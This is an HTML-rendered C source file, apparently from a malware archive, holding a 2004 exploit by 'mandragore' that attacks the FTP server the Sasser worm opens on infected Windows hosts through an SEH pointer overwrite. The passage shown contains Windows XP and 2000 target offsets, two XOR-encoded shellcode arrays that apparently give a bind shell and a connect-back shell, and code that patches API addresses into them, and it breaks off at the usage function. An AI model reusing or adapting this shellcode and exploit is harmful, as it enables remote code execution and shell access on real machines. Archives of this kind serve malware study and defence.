<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Net-Worm.Win32.Sasser.a - sasserftpd.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc12 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
  _________ / ___// ____/ ____/
 / ___/ __ \\__ \/ __/ / /
/ /  / /_/ /__/ / /___/ /___
/_/   \____/____/_____/\____/

- ROMANIAN SECURITY RESEARCH 2004 -


sasser v[a-e] exploit (of its ftpd server)

exploit version 1.4, public

author:  mandragore
date:  Mon May 10 16:13:31     2004
vuln type: SEH ptr overwriting
greets:  rosecurity team
discovery: edcba
note:  sasser.e has its ftpd on port 1023
update:  offsets

*/</span><span class="sc0">

</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;strings.h&gt;
#include &lt;signal.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
</span><span class="sc0">
</span><span class="sc9">#define NORM  "\033[00;00m"
#define GREEN "\033[01;32m"
#define YELL  "\033[01;33m"
#define RED   "\033[01;31m"
</span><span class="sc0">
</span><span class="sc9">#define BANNER GREEN "[%%] " YELL "mandragore's sploit v1.4 for " RED
</span><span class="sc6">"sasser.x"</span><span class="sc0"> </span><span class="sc11">NORM</span><span class="sc0">

</span><span class="sc9">#define fatal(x) { perror(x); exit(1); }
</span><span class="sc0">
</span><span class="sc9">#define default_port 5554
</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">os</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">goreg</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">gpa</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">lla</span><span class="sc10">;}</span><span class="sc0">
</span><span class="sc11">targets</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc2">//  { "os", pop pop ret, GetProcAd ptr, LoadLib ptr },
</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc6">"wXP SP1 many"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x77BEEB23</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x77be10CC</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x77be10D0</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0"> </span><span class="sc2">// msvcrt.dll's
</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc6">"wXP SP1 most others"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x77C1C0BD</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x77C110CC</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x77c110D0</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
 </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc6">"w2k SP4 many"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x7801D081</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x780320cc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x780320d0</span><span class="sc0"> </span><span class="sc10">},</span><span class="sc0">
</span><span class="sc10">},</span><span class="sc0"> </span><span class="sc11">tsz</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">bsh</span><span class="sc10">[]={</span><span class="sc0">
</span><span class="sc4">0xEB</span><span class="sc10">,</span><span class="sc4">0x0F</span><span class="sc10">,</span><span class="sc4">0x8B</span><span class="sc10">,</span><span class="sc4">0x34</span><span class="sc10">,</span><span class="sc4">0x24</span><span class="sc10">,</span><span class="sc4">0x33</span><span class="sc10">,</span><span class="sc4">0xC9</span><span class="sc10">,</span><span class="sc4">0x80</span><span class="sc10">,</span><span class="sc4">0xC1</span><span class="sc10">,</span><span class="sc4">0xDD</span><span class="sc10">,</span><span class="sc4">0x80</span><span class="sc10">,</span><span class="sc4">0x36</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0xE2</span><span class="sc10">,</span><span class="sc4">0xFA</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xC3</span><span class="sc10">,</span><span class="sc4">0xE8</span><span class="sc10">,</span><span class="sc4">0xEC</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc10">,</span><span class="sc4">0xBA</span><span class="sc10">,</span><span class="sc4">0xB9</span><span class="sc10">,</span><span class="sc4">0x51</span><span class="sc10">,</span><span class="sc4">0xD8</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xFE</span><span class="sc10">,</span><span class="sc4">0x9E</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xB6</span><span class="sc10">,</span><span class="sc4">0xED</span><span class="sc10">,</span><span class="sc4">0xEC</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xB6</span><span class="sc10">,</span><span class="sc4">0xA9</span><span class="sc10">,</span><span class="sc4">0xAD</span><span class="sc10">,</span><span class="sc4">0xEC</span><span class="sc10">,</span><span class="sc4">0x81</span><span class="sc10">,</span><span class="sc4">0x8A</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0xCB</span><span class="sc10">,</span><span class="sc4">0xDA</span><span class="sc10">,</span><span class="sc4">0xFE</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x9E</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x49</span><span class="sc10">,</span><span class="sc4">0x47</span><span class="sc10">,</span><span class="sc4">0x8C</span><span class="sc10">,</span><span class="sc4">0x8C</span><span class="sc10">,</span><span class="sc4">0x8C</span><span class="sc10">,</span><span class="sc4">0x8C</span><span class="sc10">,</span><span class="sc4">0x9C</span><span class="sc10">,</span><span class="sc4">0x8C</span><span class="sc10">,</span><span class="sc4">0x9C</span><span class="sc10">,</span><span class="sc4">0x8C</span><span class="sc10">,</span><span class="sc4">0x36</span><span class="sc10">,</span><span class="sc4">0xD5</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x89</span><span class="sc10">,</span><span class="sc4">0x8D</span><span class="sc10">,</span><span class="sc4">0x9F</span><span class="sc10">,</span><span class="sc4">0x8D</span><span class="sc10">,</span><span class="sc4">0xB1</span><span class="sc10">,</span><span class="sc4">0xBD</span><span class="sc10">,</span><span class="sc4">0xB5</span><span class="sc10">,</span><span class="sc4">0xBB</span><span class="sc10">,</span><span class="sc4">0xAA</span><span class="sc10">,</span><span class="sc4">0x9F</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x89</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0xC8</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x0E</span><span class="sc10">,</span><span class="sc4">0x4D</span><span class="sc10">,</span><span class="sc4">0xB4</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xB6</span><span class="sc10">,</span><span class="sc4">0xDC</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xCA</span><span class="sc10">,</span><span class="sc4">0x6A</span><span class="sc10">,</span><span class="sc4">0x55</span><span class="sc10">,</span><span class="sc4">0x1A</span><span class="sc10">,</span><span class="sc4">0xB4</span><span class="sc10">,</span><span class="sc4">0xCE</span><span class="sc10">,</span><span class="sc4">0x8E</span><span class="sc10">,</span><span class="sc4">0x8D</span><span class="sc10">,</span><span class="sc4">0x36</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xDB</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xBC</span><span class="sc10">,</span><span class="sc4">0xB7</span><span class="sc10">,</span><span class="sc4">0xB0</span><span class="sc10">,</span><span class="sc4">0xBA</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x89</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0xC8</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0x0E</span><span class="sc10">,</span><span class="sc4">0xB4</span><span class="sc10">,</span><span class="sc4">0xDF</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x8D</span><span class="sc10">,</span><span class="sc4">0x36</span><span class="sc10">,</span><span class="sc4">0xD9</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xB2</span><span class="sc10">,</span><span class="sc4">0xB7</span><span class="sc10">,</span><span class="sc4">0xAD</span><span class="sc10">,</span><span class="sc4">0xAA</span><span class="sc10">,</span><span class="sc4">0xBB</span><span class="sc10">,</span><span class="sc4">0xB0</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x89</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0xC8</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0x0E</span><span class="sc10">,</span><span class="sc4">0xB4</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x8A</span><span class="sc10">,</span><span class="sc4">0x8D</span><span class="sc10">,</span><span class="sc4">0x36</span><span class="sc10">,</span><span class="sc4">0xD9</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xBF</span><span class="sc10">,</span><span class="sc4">0xBD</span><span class="sc10">,</span><span class="sc4">0xBD</span><span class="sc10">,</span><span class="sc4">0xBB</span><span class="sc10">,</span><span class="sc4">0xAE</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xAA</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x89</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0xC8</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0x0E</span><span class="sc10">,</span><span class="sc4">0x55</span><span class="sc10">,</span><span class="sc4">0x06</span><span class="sc10">,</span><span class="sc4">0xED</span><span class="sc10">,</span><span class="sc4">0x1E</span><span class="sc10">,</span><span class="sc4">0xB4</span><span class="sc10">,</span><span class="sc4">0xCE</span><span class="sc10">,</span><span class="sc4">0x87</span><span class="sc10">,</span><span class="sc4">0x55</span><span class="sc10">,</span><span class="sc4">0x22</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x89</span><span class="sc10">,</span><span class="sc4">0xDD</span><span class="sc10">,</span><span class="sc4">0x27</span><span class="sc10">,</span><span class="sc4">0x89</span><span class="sc10">,</span><span class="sc4">0x2D</span><span class="sc10">,</span><span class="sc4">0x75</span><span class="sc10">,</span><span class="sc4">0x55</span><span class="sc10">,</span><span class="sc4">0xE2</span><span class="sc10">,</span><span class="sc4">0xFA</span><span class="sc10">,</span><span class="sc4">0x8E</span><span class="sc10">,</span><span class="sc4">0x8E</span><span class="sc10">,</span><span class="sc4">0x8E</span><span class="sc10">,</span><span class="sc4">0xB4</span><span class="sc10">,</span><span class="sc4">0xDF</span><span class="sc10">,</span><span class="sc4">0x8E</span><span class="sc10">,</span><span class="sc4">0x8E</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x36</span><span class="sc10">,</span><span class="sc4">0xDA</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xBD</span><span class="sc10">,</span><span class="sc4">0xB3</span><span class="sc10">,</span><span class="sc4">0xBA</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x8E</span><span class="sc10">,</span><span class="sc4">0x36</span><span class="sc10">,</span><span class="sc4">0xD1</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x9D</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xAC</span><span class="sc10">,</span><span class="sc4">0xBB</span><span class="sc10">,</span><span class="sc4">0xBF</span><span class="sc10">,</span><span class="sc4">0xAA</span><span class="sc10">,</span><span class="sc4">0xBB</span><span class="sc10">,</span><span class="sc4">0x8E</span><span class="sc10">,</span><span class="sc4">0xAC</span><span class="sc10">,</span><span class="sc4">0xB1</span><span class="sc10">,</span><span class="sc4">0xBD</span><span class="sc10">,</span><span class="sc4">0xBB</span><span class="sc10">,</span><span class="sc4">0xAD</span><span class="sc10">,</span><span class="sc4">0xAD</span><span class="sc10">,</span><span class="sc4">0x9F</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x18</span><span class="sc10">,</span><span class="sc4">0xD9</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x9A</span><span class="sc10">,</span><span class="sc4">0x19</span><span class="sc10">,</span><span class="sc4">0x99</span><span class="sc10">,</span><span class="sc4">0xF2</span><span class="sc10">,</span><span class="sc4">0xDF</span><span class="sc10">,</span><span class="sc4">0xDF</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x5D</span><span class="sc10">,</span><span class="sc4">0x19</span><span class="sc10">,</span><span class="sc4">0xE6</span><span class="sc10">,</span><span class="sc4">0x4D</span><span class="sc10">,</span><span class="sc4">0x75</span><span class="sc10">,</span><span class="sc4">0x75</span><span class="sc10">,</span><span class="sc4">0x75</span><span class="sc10">,</span><span class="sc4">0xBA</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xB9</span><span class="sc10">,</span><span class="sc4">0x7F</span><span class="sc10">,</span><span class="sc4">0xEE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x55</span><span class="sc10">,</span><span class="sc4">0x9E</span><span class="sc10">,</span><span class="sc4">0xD2</span><span class="sc10">,</span><span class="sc4">0x55</span><span class="sc10">,</span><span class="sc4">0x9E</span><span class="sc10">,</span><span class="sc4">0xC2</span><span class="sc10">,</span><span class="sc4">0x55</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0xAE</span><span class="sc10">,</span><span class="sc4">0xD6</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xC8</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0x0E</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">rsh</span><span class="sc10">[]={</span><span class="sc0">
</span><span class="sc4">0xEB</span><span class="sc10">,</span><span class="sc4">0x0F</span><span class="sc10">,</span><span class="sc4">0x8B</span><span class="sc10">,</span><span class="sc4">0x34</span><span class="sc10">,</span><span class="sc4">0x24</span><span class="sc10">,</span><span class="sc4">0x33</span><span class="sc10">,</span><span class="sc4">0xC9</span><span class="sc10">,</span><span class="sc4">0x80</span><span class="sc10">,</span><span class="sc4">0xC1</span><span class="sc10">,</span><span class="sc4">0xB6</span><span class="sc10">,</span><span class="sc4">0x80</span><span class="sc10">,</span><span class="sc4">0x36</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0xE2</span><span class="sc10">,</span><span class="sc4">0xFA</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xC3</span><span class="sc10">,</span><span class="sc4">0xE8</span><span class="sc10">,</span><span class="sc4">0xEC</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc10">,</span><span class="sc4">0xBA</span><span class="sc10">,</span><span class="sc4">0xB9</span><span class="sc10">,</span><span class="sc4">0x51</span><span class="sc10">,</span><span class="sc4">0xD8</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xFE</span><span class="sc10">,</span><span class="sc4">0x9E</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xB6</span><span class="sc10">,</span><span class="sc4">0xED</span><span class="sc10">,</span><span class="sc4">0xEC</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xB6</span><span class="sc10">,</span><span class="sc4">0xA9</span><span class="sc10">,</span><span class="sc4">0xAD</span><span class="sc10">,</span><span class="sc4">0xEC</span><span class="sc10">,</span><span class="sc4">0x81</span><span class="sc10">,</span><span class="sc4">0x8A</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0xCB</span><span class="sc10">,</span><span class="sc4">0xDA</span><span class="sc10">,</span><span class="sc4">0xFE</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x9E</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x49</span><span class="sc10">,</span><span class="sc4">0x47</span><span class="sc10">,</span><span class="sc4">0x8C</span><span class="sc10">,</span><span class="sc4">0x8C</span><span class="sc10">,</span><span class="sc4">0x8C</span><span class="sc10">,</span><span class="sc4">0x8C</span><span class="sc10">,</span><span class="sc4">0x9C</span><span class="sc10">,</span><span class="sc4">0x8C</span><span class="sc10">,</span><span class="sc4">0x9C</span><span class="sc10">,</span><span class="sc4">0x8C</span><span class="sc10">,</span><span class="sc4">0x36</span><span class="sc10">,</span><span class="sc4">0xD5</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x89</span><span class="sc10">,</span><span class="sc4">0x8D</span><span class="sc10">,</span><span class="sc4">0x9F</span><span class="sc10">,</span><span class="sc4">0x8D</span><span class="sc10">,</span><span class="sc4">0xB1</span><span class="sc10">,</span><span class="sc4">0xBD</span><span class="sc10">,</span><span class="sc4">0xB5</span><span class="sc10">,</span><span class="sc4">0xBB</span><span class="sc10">,</span><span class="sc4">0xAA</span><span class="sc10">,</span><span class="sc4">0x9F</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x89</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0xC8</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x0E</span><span class="sc10">,</span><span class="sc4">0x4D</span><span class="sc10">,</span><span class="sc4">0xB6</span><span class="sc10">,</span><span class="sc4">0xA1</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDF</span><span class="sc10">,</span><span class="sc4">0xB6</span><span class="sc10">,</span><span class="sc4">0xDC</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xCA</span><span class="sc10">,</span><span class="sc4">0x6A</span><span class="sc10">,</span><span class="sc4">0x55</span><span class="sc10">,</span><span class="sc4">0x1A</span><span class="sc10">,</span><span class="sc4">0xB4</span><span class="sc10">,</span><span class="sc4">0xCE</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x8E</span><span class="sc10">,</span><span class="sc4">0x8D</span><span class="sc10">,</span><span class="sc4">0x36</span><span class="sc10">,</span><span class="sc4">0xD6</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xBD</span><span class="sc10">,</span><span class="sc4">0xB1</span><span class="sc10">,</span><span class="sc4">0xB0</span><span class="sc10">,</span><span class="sc4">0xB0</span><span class="sc10">,</span><span class="sc4">0xBB</span><span class="sc10">,</span><span class="sc4">0xBD</span><span class="sc10">,</span><span class="sc4">0xAA</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x89</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0xC8</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0x0E</span><span class="sc10">,</span><span class="sc4">0xB4</span><span class="sc10">,</span><span class="sc4">0xCE</span><span class="sc10">,</span><span class="sc4">0x87</span><span class="sc10">,</span><span class="sc4">0x55</span><span class="sc10">,</span><span class="sc4">0x22</span><span class="sc10">,</span><span class="sc4">0x89</span><span class="sc10">,</span><span class="sc4">0xDD</span><span class="sc10">,</span><span class="sc4">0x27</span><span class="sc10">,</span><span class="sc4">0x89</span><span class="sc10">,</span><span class="sc4">0x2D</span><span class="sc10">,</span><span class="sc4">0x75</span><span class="sc10">,</span><span class="sc4">0x55</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xE2</span><span class="sc10">,</span><span class="sc4">0xFA</span><span class="sc10">,</span><span class="sc4">0x8E</span><span class="sc10">,</span><span class="sc4">0x8E</span><span class="sc10">,</span><span class="sc4">0x8E</span><span class="sc10">,</span><span class="sc4">0xB4</span><span class="sc10">,</span><span class="sc4">0xDF</span><span class="sc10">,</span><span class="sc4">0x8E</span><span class="sc10">,</span><span class="sc4">0x8E</span><span class="sc10">,</span><span class="sc4">0x36</span><span class="sc10">,</span><span class="sc4">0xDA</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xBD</span><span class="sc10">,</span><span class="sc4">0xB3</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xBA</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x8E</span><span class="sc10">,</span><span class="sc4">0x36</span><span class="sc10">,</span><span class="sc4">0xD1</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x9D</span><span class="sc10">,</span><span class="sc4">0xAC</span><span class="sc10">,</span><span class="sc4">0xBB</span><span class="sc10">,</span><span class="sc4">0xBF</span><span class="sc10">,</span><span class="sc4">0xAA</span><span class="sc10">,</span><span class="sc4">0xBB</span><span class="sc10">,</span><span class="sc4">0x8E</span><span class="sc10">,</span><span class="sc4">0xAC</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xB1</span><span class="sc10">,</span><span class="sc4">0xBD</span><span class="sc10">,</span><span class="sc4">0xBB</span><span class="sc10">,</span><span class="sc4">0xAD</span><span class="sc10">,</span><span class="sc4">0xAD</span><span class="sc10">,</span><span class="sc4">0x9F</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x18</span><span class="sc10">,</span><span class="sc4">0xD9</span><span class="sc10">,</span><span class="sc4">0x9A</span><span class="sc10">,</span><span class="sc4">0x19</span><span class="sc10">,</span><span class="sc4">0x99</span><span class="sc10">,</span><span class="sc4">0xF2</span><span class="sc10">,</span><span class="sc4">0xDF</span><span class="sc10">,</span><span class="sc4">0xDF</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x5D</span><span class="sc10">,</span><span class="sc4">0x19</span><span class="sc10">,</span><span class="sc4">0xE6</span><span class="sc10">,</span><span class="sc4">0x4D</span><span class="sc10">,</span><span class="sc4">0x75</span><span class="sc10">,</span><span class="sc4">0x75</span><span class="sc10">,</span><span class="sc4">0x75</span><span class="sc10">,</span><span class="sc4">0xBA</span><span class="sc10">,</span><span class="sc4">0xB9</span><span class="sc10">,</span><span class="sc4">0x7F</span><span class="sc10">,</span><span class="sc4">0xEE</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x55</span><span class="sc10">,</span><span class="sc4">0x9E</span><span class="sc10">,</span><span class="sc4">0xD2</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x55</span><span class="sc10">,</span><span class="sc4">0x9E</span><span class="sc10">,</span><span class="sc4">0xC2</span><span class="sc10">,</span><span class="sc4">0x55</span><span class="sc10">,</span><span class="sc4">0xDE</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0xAE</span><span class="sc10">,</span><span class="sc4">0xD6</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0xC8</span><span class="sc10">,</span><span class="sc4">0x21</span><span class="sc10">,</span><span class="sc4">0x0E</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">verbose</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">setoff</span><span class="sc10">(</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">GPA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">LLA</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">gpa</span><span class="sc10">=</span><span class="sc11">GPA</span><span class="sc10">^</span><span class="sc4">0xdededede</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lla</span><span class="sc10">=</span><span class="sc11">LLA</span><span class="sc10">^</span><span class="sc4">0xdededede</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">bsh</span><span class="sc10">+</span><span class="sc4">0x1d</span><span class="sc10">,&amp;</span><span class="sc11">gpa</span><span class="sc10">,</span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">bsh</span><span class="sc10">+</span><span class="sc4">0x2e</span><span class="sc10">,&amp;</span><span class="sc11">lla</span><span class="sc10">,</span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">rsh</span><span class="sc10">+</span><span class="sc4">0x1d</span><span class="sc10">,&amp;</span><span class="sc11">gpa</span><span class="sc10">,</span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">rsh</span><span class="sc10">+</span><span class="sc4">0x2e</span><span class="sc10">,&amp;</span><span class="sc11">lla</span><span class="sc10">,</span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">usage</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">argv0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

